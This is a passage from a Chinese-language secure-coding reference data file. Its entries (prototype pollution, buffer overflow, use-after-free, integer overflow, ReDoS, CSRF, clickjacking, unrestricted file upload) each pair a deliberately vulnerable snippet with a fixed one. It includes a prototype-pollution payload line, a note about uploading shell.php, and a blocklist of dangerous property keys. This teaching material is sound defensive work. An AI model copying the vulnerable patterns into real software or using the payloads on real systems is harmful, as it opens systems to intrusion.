// 攻击: deepMerge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 过滤危险属性
function safeMerge(target, source) {
  const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);
  for (let key in source) {
    if (BLOCKED.has(key)) continue;
    const val = source[key];
    if (val && typeof val === "object" && !Array.isArray(val)) {
      target[key] = safeMerge(target[key] || {}, val);
    } else {
      target[key] = val;
    }
  }
  return target;
}`,
    },
    languages: ['JavaScript'],
    references: ['https://owasp.org/www-community/attacks/Prototype_Pollution'],
  },

  // ==================== MEMORY SAFETY ====================
  {
    id: 'buffer-overflow',
    title: '缓冲区溢出',
    titleEn: 'Buffer Overflow',
    category: 'memory',
    severity: 'critical',
    cwe: 'CWE-120',
    owasp: '—',
    description: '程序向固定大小的缓冲区写入超出其容量的数据,覆盖相邻内存中的返回地址、函数指针等关键数据,可导致程序崩溃或任意代码执行。',
    cause: '使用不安全的 C 函数 (gets、strcpy、sprintf、scanf 无长度限制);数组索引未做边界检查;整数溢出导致缓冲区分配不足。',
    impact: '任意代码执行 (RCE)、程序崩溃 (DoS)、权限提升至 root/SYSTEM。',
    prevention: [
      '使用内存安全语言 (Rust、Go、Java、C#) 替代 C/C++',
      'C/C++ 中强制使用安全函数: strncpy、snprintf、fgets',
      '启用编译器安全特性: Stack Canaries (-fstack-protector)、ASLR、DEP/NX、CFI',
      '使用 AddressSanitizer (ASan) 和 Fuzzing 进行测试',
    ],
    vulnerableCode: {
      language: 'c',
      code: `/* 不安全: gets() 完全无边界检查 */
#include <stdio.h>

int main() {
    char buffer[64];
    printf("Enter name: ");
    gets(buffer);  /* 危险! 输入 > 64 字符即溢出 */
    printf("Hello %s", buffer);
    return 0;
}`,
    },
    fixedCode: {
      language: 'c',
      code: `/* 安全: fgets() + sizeof 限制输入长度 */
#include <stdio.h>
#include <string.h>

int main() {
    char buffer[64];
    printf("Enter name: ");
    if (fgets(buffer, sizeof(buffer), stdin)) {
        buffer[strcspn(buffer, "\\n")] = 0; /* 移除换行符 */
        printf("Hello %s", buffer);
    }
    return 0;
}`,
    },
    languages: ['C', 'C++'],
    references: [
      'https://cwe.mitre.org/data/definitions/120.html',
      'https://owasp.org/www-community/vulnerabilities/Buffer_Overflow',
    ],
  },
  {
    id: 'use-after-free',
    title: '释放后使用',
    titleEn: 'Use-After-Free (UAF)',
    category: 'memory',
    severity: 'critical',
    cwe: 'CWE-416',
    owasp: '—',
    description: '程序在释放一块内存后仍继续使用指向该内存的指针 (悬垂指针),这块内存可能已被重新分配给其他用途,导致信息泄露或代码执行。',
    cause: '内存管理混乱,释放内存后指针未置 NULL;复杂的所有权传递中提前释放;C++ 中未正确使用智能指针而用裸指针。',
    impact: '任意代码执行、敏感信息从释放内存中被读取、程序崩溃。',
    prevention: [
      '释放后立即将指针设为 NULL (free(ptr); ptr = NULL;)',
      'C++ 中优先使用智能指针 (std::unique_ptr、std::shared_ptr)',
      '使用 AddressSanitizer (ASan) 运行时检测 UAF',
      '优先使用 Rust 等内存安全语言进行新项目开发',
    ],
    vulnerableCode: {
      language: 'cpp',
      code: `// 不安全: 释放后使用
char* ptr = new char[100];
strcpy(ptr, "sensitive data");
delete[] ptr;
// ... 很多代码之后, 忘记 ptr 已释放 ...
printf("%s", ptr);  // UAF! 内存可能已被其他数据覆盖`,
    },
    fixedCode: {
      language: 'cpp',
      code: `// 安全: 智能指针自动管理生命周期
#include <memory>
#include <string>

// unique_ptr 在作用域结束时自动释放
auto ptr = std::make_unique<char[]>(100);
strcpy(ptr.get(), "sensitive data");
// ptr 离开作用域自动调用 delete[], 无法再访问

// 或者使用 std::string:
std::string data = "sensitive data";
printf("%s", data.c_str());`,
    },
    languages: ['C', 'C++'],
    references: ['https://cwe.mitre.org/data/definitions/416.html'],
  },
  {
    id: 'integer-overflow',
    title: '整数溢出',
    titleEn: 'Integer Overflow',
    category: 'memory',
    severity: 'high',
    cwe: 'CWE-190',
    owasp: '—',
    description: '算术运算结果超出数据类型的最大值导致值回绕 (如 unsigned char 的 255+1=0), 可能引发缓冲区分配过小、金额计算截断、数组越界等严重问题。',
    cause: '未对算术运算做溢出检查;使用有符号整数表示大小/长度;类型转换时的截断;用户输入极大数值。',
    impact: '堆/栈缓冲区溢出、加密货币的金额计算漏洞、数组越界读写。',
    prevention: [
      '使用编译器内置溢出检查: gcc -ftrapv、Rust checked_add、checked_mul',
      '运算前验证操作数范围,确保结果不会溢出',
      '存储大小/偏移量使用 size_t 类型',
      '使用安全算术库或 BigInteger 做任意精度运算',
    ],
    vulnerableCode: {
      language: 'c',
      code: `/* 不安全: 可能溢出导致分配不足 */
int user_count = get_user_count();
int alloc_size = user_count * sizeof(Record);  /* 可能溢出! */
char* buf = malloc(alloc_size);
/* 若 user_count 极大, alloc_size 溢出为很小的值 */`,
    },
    fixedCode: {
      language: 'c',
      code: `/* 安全: 溢出前检查 */
size_t user_count = get_user_count();
if (user_count > SIZE_MAX / sizeof(Record)) {
    return ERROR_BUFFER_TOO_LARGE;  /* 溢出检测 */
}
size_t alloc_size = user_count * sizeof(Record);
char* buf = malloc(alloc_size);
if (!buf) return ERROR_OUT_OF_MEMORY;`,
    },
    languages: ['C', 'C++', 'Solidity', 'Rust (unsafe)'],
    references: ['https://cwe.mitre.org/data/definitions/190.html'],
  },

  // ==================== REGEX DOS ====================
  {
    id: 'regex-dos',
    title: '正则表达式拒绝服务',
    titleEn: 'ReDoS (Regular Expression Denial of Service)',
    category: 'memory',
    severity: 'medium',
    cwe: 'CWE-1333',
    owasp: '—',
    description: '恶意构造的输入触发正则表达式引擎的灾难性回溯 (Catastrophic Backtracking), CPU 100% 长时间无响应,造成应用层拒绝服务。',
    cause: '正则表达式存在嵌套量词 (如 (a+)+、([a-zA-Z]+)*$、;(.*,)*) 导致的指数级回溯路径;.NET/PCRE/Java 等回溯引擎尤易受害。',
    impact: '服务完全不可用、CPU 资源耗尽、云环境触发自动扩容成本激增。',
    prevention: [
      '避免正则中的嵌套量词: 将 (a+)+ 改为 a+',
      '使用拥有量词 (*+、++、?+) 或原子分组 (>、(*atomic:) ) 防止回溯',
      '设置正则执行超时 (.NET Regex 的 matchTimeout)',
      '对小字符串做正则匹配,大输入先用索引方法预处理',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 灾难性回溯 (指数复杂度)
const regex = /^(a+)+$/;
regex.test("aaaaaaaaaaaaaaaaaaaaaaaaX");
// 输入越长, 耗时指数级增长, CPU 100%`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 消除嵌套量词 (线性复杂度)
const regex = /^a+$/;
regex.test("aaaaaaaaaaaaaaaaaaaaaaaaX");
// O(n) 时间复杂度, 立即返回 false

// 如果必须复杂匹配, 使用拥有量词 (需引擎支持):
// /^(a++)+$/  ← 拥有量词不回溯`,
    },
    languages: ['JavaScript', 'Python', 'Java', 'PHP', 'Ruby', 'C#'],
    references: [
      'https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS',
    ],
  },

  // ==================== CSRF & UI ====================
  {
    id: 'csrf',
    title: '跨站请求伪造',
    titleEn: 'Cross-Site Request Forgery (CSRF)',
    category: 'csrf',
    severity: 'high',
    cwe: 'CWE-352',
    owasp: 'A01:2021',
    description: '攻击者诱导已认证用户点击恶意链接或访问恶意页面,以用户的身份在目标站点执行非预期的状态变更操作 (转账、修改邮箱/密码、删除数据)。',
    cause: '关键写操作 (POST/PUT/DELETE) 仅依赖 Cookie 进行身份认证,未要求额外的不可预测令牌验证请求来源。',
    impact: '资金盗转、账户邮箱/密码被修改、数据被删除、以受害者身份发帖/下单。',
    prevention: [
      '使用 Anti-CSRF Token (Synchronizer Token Pattern)',
      'Cookie 设置 SameSite=Lax (现代浏览器默认) 或 Strict',
      '验证 Origin / Referer 请求头',
      '关键操作要求重新认证 (密码确认) 或二次验证',
    ],
    vulnerableCode: {
      language: 'html',
      code: `<!-- 不安全: 无 CSRF 防护的表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to_account" placeholder="收款账号">
  <input name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>
<!-- 仅依赖 Session Cookie 验证, 无 CSRF Token -->`,
    },
    fixedCode: {
      language: 'html',
      code: `<!-- 安全: CSRF Token -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="to_account" placeholder="收款账号">
  <input name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>

<!-- 服务端设置: Cookie SameSite=Strict -->
<!-- 验证 Origin / Referer 头 -->
<!-- 中间件: csurf / csrf 库 -->`,
    },
    languages: ['All'],
    references: [
      'https://owasp.org/www-community/attacks/csrf',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'clickjacking',
    title: '点击劫持',
    titleEn: 'Clickjacking',
    category: 'csrf',
    severity: 'medium',
    cwe: 'CWE-1021',
    owasp: '—',
    description: '攻击者将目标网站通过透明 iframe 覆盖在诱饵页面上,用户以为在点击可见按钮,实际点击了隐藏 iframe 中的按钮 (如授权、转账、开启摄像头)。',
    cause: '网站未阻止自己被嵌入到 iframe 中,缺少 X-Frame-Options 或 CSP frame-ancestors 响应头。',
    impact: '用户无感知执行敏感操作、社交网络点赞/关注被操控、摄像头/麦克风授权。',
    prevention: [
      '响应头: X-Frame-Options: DENY 或 SAMEORIGIN',
      '响应头: Content-Security-Policy: frame-ancestors \'none\'',
      '传统 Frame Busting JS 不如 HTTP Header 可靠, 但可做纵深防御',
    ],
    vulnerableCode: {
      language: 'html',
      code: `<!-- 不安全: 无 iframe 嵌入防护 -->
<html>
<head><title>网上银行</title></head>
<body>
  <h1>转账</h1>
  <button>确认转账</button>
  <!-- 可被透明 iframe 叠加劫持 -->
</body>
</html>`,
    },
    fixedCode: {
      language: 'nginx',
      code: `# 安全: 响应头级别防护
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
# DENY: 任何页面都不能嵌入本站在 iframe 中
# SAMEORIGIN: 允许同源页面嵌入 (如需内部 iframe)`,
    },
    languages: ['All'],
    references: ['https://owasp.org/www-community/attacks/Clickjacking'],
  },

  // ==================== INSECURE FILE UPLOAD ====================
  {
    id: 'insecure-file-upload',
    title: '不安全文件上传',
    titleEn: 'Unrestricted File Upload',
    category: 'misconfiguration',
    severity: 'high',
    cwe: 'CWE-434',
    owasp: 'A05:2021',
    description: '应用未对用户上传文件做充分校验,攻击者可上传 Web Shell、恶意脚本或超大文件,导致服务器被控制或拒绝服务。',
    cause: '仅依赖客户端验证;未校验文件 MIME 类型和魔数;允许上传可执行扩展名 (.php、.jsp、.exe);上传目录在 Web 根目录下且允许执行。',
    impact: 'Web Shell 导致远程代码执行、恶意文件分发、存储空间耗尽、跨站脚本。',
    prevention: [
      '服务端双重校验: 检查文件魔数 (Magic Bytes) 而非仅信任 Content-Type',
      '白名单限制允许的文件扩展名 (如仅 .jpg、.png、.pdf)',
      '上传目录设置在 Web 根目录之外,或配置该目录不执行脚本',
      '文件重命名为 UUID,避免使用用户提供的文件名',
      '限制上传文件大小;对图片进行重编码去除嵌入式恶意代码',
    ],
    vulnerableCode: {
      language: 'php',
      code: `<?php
// 不安全: 信任用户文件名和扩展名
$target = "uploads/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
echo "Uploaded to: $target";
// 攻击: 上传 shell.php -> 直接访问执行
?>`,
    },
    fixedCode: {
      language: 'php',
      code: `<?php
// 安全: 多层验证 + 安全存储
$allowed = ["image/jpeg", "image/png", "application/pdf"];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES["file"]["tmp_name"]);

if (!in_array($mime, $allowed)) die("Invalid file type");
if ($_FILES["file"]["size"] > 5 * 1024 * 1024) die("File too large");

$ext = ["image/jpeg" => "jpg", "image/png" => "png", "application/pdf" => "pdf"];
$name = bin2hex(random_bytes(16)) . "." . $ext[$mime];
$target = "/var/storage/" . $name;  // Web 根目录之外!
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
?>`,
    },
    languages: ['PHP', 'Java', 'Python', 'Node.js', 'Go', 'Ruby'],
    references: [
      'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
      'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html',
    ],
  },
]
